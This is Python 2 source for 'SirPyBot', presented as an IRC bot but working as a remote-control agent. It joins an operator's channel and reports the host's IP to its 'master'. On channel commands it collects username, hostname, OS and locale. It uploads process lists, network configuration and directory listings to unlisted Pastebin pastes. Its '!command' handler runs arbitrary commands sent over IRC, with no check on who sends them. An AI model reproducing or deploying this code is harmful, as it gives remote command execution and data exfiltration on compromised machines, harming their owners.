'''
Name: sirpybot.py
Description: IRC Bot
Author: Lopi
Contributors: b0b (windows stuff), akama (uptime and ls)
Version: 0.2
TODO: upload
      download
      ls -lahF /directory/you/want (dir equivalent) -- Fixed to work on Linux
      execute shell commands

TESTING:

Windows
--------
uptime
ls

'''
# Libraries
import socket # Communicate with irc server
import sys # CLI options
import os # System calls
import platform # System info gathering
import locale # System language
import urllib2 # Used to get external ip address
import argparse # CLI arg parsing
import subprocess # Spawn subprocesses
import time # IMport time for sleep
from pastebin import PastebinAPI # Paste to pastebin

# CLI options
parser = argparse.ArgumentParser()
parser.add_argument('server', help='IRC Server IP Address')
parser.add_argument('port', help='IRC Server Port')
parser.add_argument('channel', help='IRC Server Channel')
parser.add_argument('nick', help='Nickname')
args = parser.parse_args()

# Global variables to configure the bot 
pastebin_api_key = '-----INSERT KEY HERE-----'    
server = args.server  # Server
port = args.port    # Port
channel = '#' + args.channel # Channel
botnick = args.nick # Nickname
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IRC Socket


# Functions are defined below

def banner(): # Displayed when the program starts
  title = 'SirPyBot'
  version = 'Version 0.2'
  contact = 'chris[dot]spehn[at]gmail[dot]com'
  print '\n' + title.center(45)
  print '\n' + version.center(45)
  print '\n' + contact.center(45)

def ping(): # Function to respond to server pings
  ircsock.send('PONG :pingis\n')

def sysinfo(): # Function to obtain system information
  print 'Sending system information'
  if (str(platform.platform()))[0:3]=="Win": # If user is running Windows, get username from environment variable %USERNAME% instead
    sendmsg(channel, 'User name: ' + str(os.getenv("USERNAME")))
    sendmsg(channel, 'Computer: ' + platform.uname()[1])
    sendmsg(channel, 'OS: ' + platform.platform()) 
    sendmsg(channel, 'Arch: ' + platform.machine())
    sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])
  else:
    sendmsg(channel, 'User name: ' + str(os.getlogin()))
    sendmsg(channel, 'Computer: ' + platform.uname()[1])
    sendmsg(channel, 'OS: ' + platform.platform()) 
    sendmsg(channel, 'Arch: ' + platform.machine())
    sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])

def get_external_ip(): # Function to get external ip address
  try:
    ip = urllib2.urlopen('http://automation.whatismyip.com/n09230945.asp').read()
    sendmsg(channel, 'Connecting from ' + ip + ' to serve you master!')

  except urllib2.HTTPError, e:
    print 'There was an HTTP error: ' + e
    sendmsg(channel, 'There was an HTTP error: ' + e)

  except urllib2.URLError, e:
    print 'There was a problem with the URL: ' + e
    sendmsg(channel, 'There was a problem with the URL: ' + e)

def pslist(): # Function to list process names and pids
  x = PastebinAPI()
  if (str(platform.platform()))[0:3]=="Win":
    # TODO: make this pretty
    p = subprocess.Popen('tasklist', shell=False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'tasklist', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')
    sendmsg(channel, url)
  else:
    p = subprocess.Popen(['ps', 'aux'], shell=False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'ps aux', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')
    sendmsg(channel, url)

def ifconfig(): # Displays network interfaces
  if (str(platform.platform()))[0:3]=="Win":
    p = subprocess.Popen('ipconfig /all', shell=False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    x = PastebinAPI()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'ipconfig', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')
    sendmsg(channel, url)
  else:
    p = subprocess.Popen('ifconfig', shell=False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    x = PastebinAPI()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'ifconfig', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')

    sendmsg(channel, url)

# Error check might not work
def ls(dir): # Directory listing
  if (str(platform.platform()))[0:3]=="Win":
    p = subprocess.Popen(['dir',dir], shell=False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    x = PastebinAPI()
    url = x.paste(pastebin_api_key,
                  paste_code,
                  paste_name = 'ls -lahF', 
                  paste_private = 'unlisted',
                  paste_expire_date = '10M')

    sendmsg(channel, url)
  else:
    x = PastebinAPI()
    p = subprocess.Popen(['ls', dir, '-lahF'], shell=False, stdout=subprocess.PIPE)
    p.wait()
    paste_code = p.stdout.read()
    if paste_code == '':
       sendmsg(channel, 'No such file or directory')
    else:
      url = x.paste(pastebin_api_key,
                       paste_code,
                       paste_name = 'ls -lahF', 
                       paste_private = 'unlisted',
                       paste_expire_date = '10M')
      sendmsg(channel, url)

def uptime(): #Check the uptime of the box that the bot is running on.
  if (str(platform.platform())) [0:3]=="Win":
    #This may or may not work, untested at the moment. akama.
    p = subprocess.Popen('systeminfo | find "System Boot Time"', shell=False, stdout=subprocess.PIPE)
    p.wait()
    output = p.stdout.read()
    sendmsg(channel, output) 
  else:
    p = subprocess.Popen('uptime', shell=False, stdout=subprocess.PIPE)
    p.wait()
    output = p.stdout.read()
    sendmsg(channel, output)
 
def pwd(): # Print working directory
  sendmsg(channel, os.getcwd())

def help(): # Tells the bot owner what commands are available
  sendmsg(channel, 'The following commands are available: hello | sysinfo | getip | pslist | ifconfig | pwd | uptime | ls')

def sendmsg(chan , msg): # Function to send messages to the channel
  ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')

def joinchan(chan): # Function to join channels
  ircsock.send('JOIN '+ chan +'\n')

def hello(): # Function responds to a user that inputs 'Hello BotName'
  ircsock.send('PRIVMSG '+ channel +' :Hello!\n')
          
def connect(): # Connects to the server, finds commands, etc.
  ircsock.connect((server, int(port))) # Connect to the server
  ircsock.send('USER ' + botnick + ' ' + botnick + ' ' + botnick + ' :' + botnick + '\n') # User authentication
  ircsock.send('NICK '+ botnick +'\n') # Assign NICK to the bot
  joinchan(channel) # Join the channel

def command(com):
  if (str(platform.platform())) [0:3]=="Win":
    sendmsg(channel, '"womdows is not supported at this time, this might not work.')
    try:
      p = subprocess.Popen(com.split(" "), shell=False, stdout=subprocess.PIPE)
      p.wait()
      output = p.stdout.read()
      for line in output.split('\n'):
        if ( line != ''):
	  time.sleep(0.5)
	  sendmsg(channel, line)
    except OSError:
      sendmsg(channel, 'This is not an valid command.')
     
  else:
    try:
      p = subprocess.Popen(com.split(" "), shell=False, stdout=subprocess.PIPE)
      p.wait()
      output = p.stdout.read()
      for line in output.split('\n'):
        if ( line != ''):
	  time.sleep(0.5)
	  sendmsg(channel, line)
    except OSError:
      sendmsg(channel, 'This is not an valid command.')
 
def main():
  os.system('clear') # Clear the screen
  banner() # Print the banner
  connect() # Connect to the Server
  get_external_ip() # Announces where the bot is connecting from  

  while 1: # WARNING: May cause an infinite loop

    ircmsg = ircsock.recv(2048) # Receive data from the server
    ircmsg = ircmsg.strip('\n\r') # Remove linebreaks
    print(ircmsg) # Print server's messages
  
    if ircmsg.find(':!hello') != -1: # Calls hello() if 'hello BotName' is found
      hello()

    if ircmsg.find('PING :') != -1: # Respond to server pings
      ping()

    if ircmsg.find(':!sysinfo') != -1: # Calls sysinfo() if 'sysinfo BotName' is found
      sysinfo()    

    if ircmsg.find(':!getip') != -1: # Calls get_external_ip() if 'getip BotName' is found
      get_external_ip()

    if ircmsg.find(':!pslist') != -1: # Calls pslist() if 'pslist BotName' is found
      pslist()

    if ircmsg.find(':!ifconfig') != -1: # Calls pslist() if 'ifconfig BotName' is found
      ifconfig()

    if ircmsg.find(':!pwd') != -1: # Calls pwd() if 'pwd BotName' is found
      pwd()

    if ircmsg.find(':!uptime') != -1: # Calls uptime() if 'uptime BotName' is found
      uptime()

    if ircmsg.find(':!ls ') != -1: # Calls ls() if 'pwd BotName' is found
      dir = (ircmsg.split(" ")[len(ircmsg.split(" "))-1])
      ls(dir)

    if ircmsg.find(':!help') != -1: # Calls ls() if 'pwd BotName' is found
      help()
    
    if ircmsg.find(':!command') != -1: # Calls command() if ':command' is found
      command(ircmsg.split("!command ")[len(ircmsg.split("!command "))-1])
main()
